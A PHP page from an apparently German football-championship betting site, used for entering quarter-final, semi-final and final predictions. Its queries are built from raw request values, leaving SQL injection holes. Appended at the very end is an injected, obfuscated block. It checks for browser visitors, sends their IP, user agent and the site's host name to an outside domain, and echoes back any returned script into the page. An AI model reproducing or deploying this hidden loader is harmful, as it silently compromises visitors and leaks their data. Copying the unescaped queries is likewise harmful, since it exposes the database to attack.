<?php
// we must never forget to start the session
session_start();
if(!isset($_GET['userId']))
{
	header("Location: ../util/login.php5");
}
else
{
	include_once("../util/dbschema.php5");
	include_once("../util/dbutil.php5");
	include_once("../util/Citations.php5");
	
	$userId=$_GET["userId"];
	echo "<html>";
	echo "<head>";
	echo "<link rel='stylesheet' type='text/css' href='../../style/style.css' />";
	echo "<title>EM-Tipp - Finalspiele</title>";
	echo "</head>";
	echo "<body>";
	
	$saveMatchErrorText="";
	for($i=0;$i<100;$i++){
		if(isset($_POST["saveMatch-$i"])){
			$team1=$_POST["$i-Team1"];
			$team2=$_POST["$i-Team2"];
			//echo "saveMatch($i) team1=$team1,team2=$team2<br>";
			$saveMatchErrorText=saveMatch($i, $userId, $team1, $team2, $dbutil);
			$matchnrPost=$i;
		}
	}
	echo "<h2>Viertelfinale</h2>";
	$citation->printCitation("Viertelfinale");
	run($userId, "Viertelfinale", $matchnrPost, $dbutil, $saveMatchErrorText);
	echo "<h2>Halbfinale</h2>";
	$citation->printCitation("Halbfinale");
	run($userId, "Halbfinale", $matchnrPost, $dbutil, $saveMatchErrorText);
	echo "<h2>Finale</h2>";
	$citation->printCitation("Finale");
	run($userId, "Finale", $matchnrPost, $dbutil, $saveMatchErrorText);
}

function run($userId, $finaltype, $matchnrPost, $dbutil, $saveMatchErrorText){
	// Verbindung zur Datenbank aufbauen
	include_once("../../connection/dbaccess.php5");
	$username=$dbutil->getUserName($userId);
	$table_teams=dbschema::teams;
	$sqlTeams1=mysql_query("SELECT * FROM $table_teams ORDER BY name");
	$sqlTeams2=$sqlTeams1;
	$table_matches=dbschema::matches;
	$sqlQueryfinals="SELECT * FROM $table_matches m WHERE m.matchtype='$finaltype'";
	$sqlMatches=mysql_query($sqlQueryfinals);
	echo "<table>";
	while($array=mysql_fetch_array($sqlMatches))
	{
		$date=$array["matchdate"];
		$time=$array["matchtime"];
		$formattedTime = substr($time, 0, 5) . " Uhr";
		$matchnr=$array["matchnr"];
		$tippedTeam1=getTippedTeam($username, $matchnr, "teamX", $dbutil);
		$tippedTeam2=getTippedTeam($username, $matchnr, "teamY", $dbutil);
		$tippedGoals1=getTippedGoals($username, $matchnr, "goalsX");
		$tippedGoals2=getTippedGoals($username, $matchnr, "goalsY");
		echo "<tr>";
		echo "<form action='Finals.php5?userId=$userId&matchnr=$matchnr' method='POST'>";
		echo "<td></td>";
		printDescription($matchnr);
		// only possible teams
		if($finaltype=="Viertelfinale"){
			$sqlTeams1 = getTeamsOfGroup($matchnr, 1);
			$sqlTeams2 = getTeamsOfGroup($matchnr, 2);
		}
		if($finaltype=="Halbfinale"){
			$sqlTeams1 = getTeamsOfGroup($matchnr, 1);
			$sqlTeams2 = getTeamsOfGroup($matchnr, 2);
		}
		
		echo "</tr>";
		echo "<tr>";
		echo "<td> $date </td><td> $formattedTime </td><td> Spiel $matchnr </td> ";
		echo "<td bgcolor=slategray><select name='$matchnr-Team1'>";
		allTeamsAsOption($sqlTeams1, $tippedTeam1, "Team1");
		echo "</td>";
		echo "<td> - </td>";
		echo "<td bgcolor=slategray><select name='$matchnr-Team2'>";
		allTeamsAsOption($sqlTeams2, $tippedTeam2, "Team2");
		echo "</td>";
		echo "<td width='100' align='center'>
		<input type=\"Text\" size=\"1\" name=\"$matchnr-GoalsTeam1\" value=\"$tippedGoals1\"><b> :</b>
		<input type=\"Text\" size=\"1\" name=\"$matchnr-GoalsTeam2\" value=\"$tippedGoals2\">";
		echo "</td>";
		echo "<td><input type='submit' name='saveMatch-$matchnr' value='Speichern'></td>";
		echo "</form>";
		if($matchnrPost==$matchnr)
		{
			if(strlen($saveMatchErrorText)>0){
				echo "<td>$saveMatchErrorText <font color=\"red\"> --> <b>nicht</b> gespeichert! <font></td>";
			} else {
				echo "<td> gespeichert! </td>";
			}
		}
		echo "</tr>";
	}
	echo "</table>";
	echo "<br>";
	echo "<br>";
	//echo "&nbsp";
	//echo "<input type='submit' name='cancel' value='Abbrechen'>";
	echo "<br>";

	echo "</body>";
	echo "</html>";
}

function printDescription($matchnr){
	switch($matchnr)
	{
		case 25 : echo "<td></td><td></td><td>Sieger Gruppe A</td><td> -</td><td>Zweiter Gruppe B</td><td></td><td></td>";break;
		case 26 : echo "<td></td><td></td><td>Sieger Gruppe B</td><td> -</td><td>Zweiter Gruppe A</td><td></td><td></td>";break;
		case 27 : echo "<td></td><td></td><td>Sieger Gruppe C</td><td> -</td><td>Zweiter Gruppe D</td><td></td><td></td>";break;
		case 28 : echo "<td></td><td></td><td>Sieger Gruppe D</td><td> -</td><td>Zweiter Gruppe C</td><td></td><td></td>";break;
		case 29 : echo "<td></td><td></td><td>Sieger Spiel 25</td><td> -</td><td>Sieger Spiel 27</td><td></td><td></td>";break;
		case 30 : echo "<td></td><td></td><td>Sieger Spiel 26</td><td> -</td><td>Sieger Spiel 28</td><td></td><td></td>";break;
		case 31 : echo "<td></td><td></td><td>Sieger Spiel 29</td><td> -</td><td>Sieger Spiel 30</td><td></td><td></td>";break;
	}
}

function getTeamsOfGroup($matchnr, $named){
	//echo "<br>getTeamsOfGroup($matchnr, $named)";
	switch($matchnr)
	{
		case 25 :
			if($named==1) {
				return getTeams('A');
			}
			else
			{
				return getTeams('B');
			}
		case 26 :
			if($named==1) {
				return getTeams('B');
			}
			else
			{
				return getTeams('A');
			}
		case 27 :
			if($named==1) {
				return getTeams('C');
			}
			else
			{
				return getTeams('D');
			}
		case 28 :
			if($named==1) {
				return getTeams('D');
			}
			else
			{
				return getTeams('C');
			}
		case 29 : 
			if($named==1) {
				return getTeamsOfGroups('A','B');
			}
			else
			{
				return getTeamsOfGroups('C','D');
			}
		case 30 : 
			if($named==1) {
				return getTeamsOfGroups('A','B');
			}
			else
			{
				return getTeamsOfGroups('C','D');
			}
	}
}

function allTeamsAsOption($sqlTeams, $tippedTeam, $optionName) {
	$numTeams=mysql_num_rows($sqlTeams);
	if ($numTeams==0)
	echo "keine passenden Datensätze gefunden";
	else
	{
		if($tippedTeam!="")
		{
			echo "<option name=$optionName selected>$tippedTeam</option>";
			echo "<option name=$optionName>---</option>";
		}
		else
		{
			echo "<option name=$optionName selected>---</option>";
		}
		for ($i=0; $i<$numTeams; $i++)
		{
			$name = mysql_result($sqlTeams, $i, "name");
			if($name!=$tippedTeam)
			{
				echo"<option name=$optionName>$name</option>";
			}
		}
	}
}

function getTippedTeam($username, $matchnr, $dbColumnTeam, $dbutil){
	$table_finalmatchtipps=dbschema::finalmatchtipps;
	$sqlQuery="SELECT * FROM $table_finalmatchtipps WHERE user='$username' AND matchnr=$matchnr";
	$sqlQueryResult=mysql_query($sqlQuery);
	$sqlResultArray=mysql_fetch_array($sqlQueryResult);
	$teamShort=$sqlResultArray[$dbColumnTeam];
	return $dbutil->getTeamName($teamShort);
}

function getTeams($group){
	$table_teams=dbschema::teams;
	$sqlQuery="SELECT t.name FROM $table_teams t WHERE t.group='$group'";
	$sqlQueryResult=mysql_query($sqlQuery);
	return $sqlQueryResult;
}

function getTeamsOfGroups($group1, $group2){
	$table_teams=dbschema::teams;
	$sqlQuery="SELECT t.name FROM $table_teams t WHERE t.group='$group1' UNION SELECT t.name FROM $table_teams t WHERE t.group='$group2'";
	$sqlQueryResult=mysql_query($sqlQuery);
	return $sqlQueryResult;
}

function getTippedGoals($username, $matchnr, $dbColumnGoals){
	$table_finalmatchtipps=dbschema::finalmatchtipps;
	$sqlQuery="SELECT * FROM $table_finalmatchtipps WHERE user='$username' AND matchnr=$matchnr";
	$sqlQueryResult=mysql_query($sqlQuery);
	$sqlResultArray=mysql_fetch_array($sqlQueryResult);
	return $sqlResultArray[$dbColumnGoals];
}

function saveMatch($matchnr, $userId, $team1, $team2, $dbutil){
	// echo "saveMatch($matchnr) userId=$userId team1=$team1,team2=$team2<br>";
	include_once("../../connection/dbaccess.php5");
	include_once("../util/calc.php5");
	include_once("../util/dbschema.php5");
	include_once("../../general/log/log.php5");

	$userName=$dbutil->getUserName($userId);
	$table_matches=dbschema::matches;
	$sqlQueryFinals="SELECT * FROM $table_matches m WHERE matchnr=$matchnr";
	$sqlResultFinals=mysql_query($sqlQueryFinals);
	
	while($array=mysql_fetch_array($sqlResultFinals))
	{
		//$matchnr=$array["matchnr"];
		
		$teamShort1=$dbutil->getShortName($team1);
		$teamShort2=$dbutil->getShortName($team2);
		$goalsTeam1Str=$_POST["$matchnr-GoalsTeam1"];
		if(strlen($goalsTeam1Str)==0)
		{
			$goalsTeam1 = "NULL";
		}
		else
		{
			$goalsTeam1 = "'" . $goalsTeam1Str . "'";
		}
		$goalsTeam2Str=$_POST["$matchnr-GoalsTeam2"];
		if(strlen($goalsTeam2Str)==0)
		{
			$goalsTeam2 = "NULL";
		}
		else
		{
			$goalsTeam2 = "'" . $goalsTeam2Str . "'";
		}
		$winner=$calc->calcWinner($goalsTeam1,$goalsTeam2);
		if($team1=="---" && $team2=="---")
		{
			removeFinalMatchTipp($userName, $matchnr);
		}	
		else
		{
			if($goalsTeam1Str<0 || $goalsTeam2Str<0){
				return "Toranzahl unter 0"; 
			} else {
				insertUpdateFinalMatchTipp($userName, $matchnr, $teamShort1, $teamShort2, $goalsTeam1, $goalsTeam2, $winner);
				return "";
			}
		}
		//echo "<br> $date $time Spiel $matchnr : $team1 - $team2  &nbsp; &nbsp; <b>$goalsTeam1 : $goalsTeam2</b> winner=$winner";
	}
}

function insertUpdateFinalMatchTipp($userName, $matchnr, $teamShort1, $teamShort2, $GoalsTeam1, $GoalsTeam2, $winner){

	//echo "insertUpdateFinalMatchTipp($userName $matchnr $teamShort1 $teamShort2 $GoalsTeam1:$GoalsTeam2)<br>";
	insertUpdateInTipps($userName, $matchnr, $teamShort1, $teamShort2, $GoalsTeam1, $GoalsTeam2, $winner);
	// only for user "real"
	if($userName==='real')
	{
		updateInMatches($matchnr, "'$teamShort1'", "'$teamShort2'");
	}
}

function insertUpdateInTipps($userName, $matchnr, $teamShort1, $teamShort2, $GoalsTeam1, $GoalsTeam2, $winner){
	$table_finalmatchtipps=dbschema::finalmatchtipps;
	$goaldiff=$GoalsTeam1-$GoalsTeam2;
	if($teamShort1=='')
	{
		$teamShort1String = "NULL";
	}
	else
	{
		$teamShort1String = "'$teamShort1'";
	}
	if($teamShort2=='')
	{
		$teamShort2String = "NULL";
	}
	else
	{
		$teamShort2String = "'$teamShort2'";
	}
	
	$sqlinsert="INSERT INTO $table_finalmatchtipps (user,matchnr,teamX,teamY,goalsX,goalsY,winner,goaldiff,score)" .
			"VALUES ('$userName', '$matchnr', $teamShort1String, $teamShort2String, $GoalsTeam1, $GoalsTeam2, '$winner', '$goaldiff', '0')";
	$log=new logger();	
	$log->info($sqlinsert);
	$sqlInsertResult=mysql_query($sqlinsert);
	if (!$sqlInsertResult) {
		//$log->error(mysql_error());
		$sqlerrorInsert=mysql_error();
		$sqlupdateMatch="UPDATE $table_finalmatchtipps SET " .
			"teamX = $teamShort1String, " .
			"teamY = $teamShort2String, " .
			"goalsX = $GoalsTeam1, " .
			"goalsY = $GoalsTeam2, " .
			"winner = '$winner', " .
			"goaldiff=$goaldiff " .
			"WHERE $table_finalmatchtipps.user =  '$userName' AND $table_finalmatchtipps.matchnr =$matchnr";
		$log->info($sqlupdateMatch);
		$sqlupdateMatchResult=mysql_query($sqlupdateMatch);
		if (!$sqlupdateMatchResult) {
			$sqlerror=mysql_error();
			$log->error($sqlerror);
			echo "<br><font color='#EE0000'> Ungültiger Request: <b>$sqlupdateMatch</b> <br>Error:$sqlerror</font>";
		    echo "<br><font color='#EE0000'> vorher: <b>$sqlinsert</b> <br>Error:$sqlerrorInsert</font>";
		}
	}
}

function removeFinalMatchTipp($userName, $matchnr){
	
	removeFinalMatchInTipps($userName, $matchnr);
	if($userName==='real')
	{
		clearInMatches($matchnr);
	}
}

function removeFinalMatchInTipps($userName, $matchnr){
	$table_finalmatchtipps=dbschema::finalmatchtipps;
	$sqlremove="DELETE FROM $table_finalmatchtipps WHERE user = '$userName' AND matchnr = $matchnr";
	$log=new logger();	
	$log->info($sqlremove);
	$sqlRemoveResult=mysql_query($sqlremove);
	if ($sqlInsertResult=!1) {
		$sqlerror=mysql_error();
		$log->error($sqlerror);
		echo "<br><font color='#EE0000'> Ungültiger Request: <b>$sqlupdateMatch</b> <br>Error:$sqlerror</font>";
	}
	echo "<br> Tipp für Spiel <b>$matchnr</b> gelöscht";
}

function updateInMatches($matchnr, $teamShort1, $teamShort2){
	
	$table_matches=dbschema::matches;
	$sqlupdateMatch="UPDATE $table_matches SET " .
			"team1 = $teamShort1, " .
			"team2 = $teamShort2 " .
			"WHERE $table_matches.matchnr=$matchnr";
	$log=new logger();
	$log->info($sqlupdateMatch);
	$sqlupdateMatchResult=mysql_query($sqlupdateMatch);
	if ($sqlupdateMatchResult!=1) {
		echo "<br>sqlupdateMatchResult:$sqlupdateMatchResult";
		$sqlerror=mysql_error();
		$log->error($sqlerror);
		echo "<br><font color='#EE0000'> Ungültiger Request: <b>$sqlupdateMatch</b> <br>Error:$sqlerror</font>";
	}
}

function clearInMatches($matchnr){

	updateInMatches($matchnr, "NULL", "NULL");
}

?>
<?php
#292641#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/292641#
?>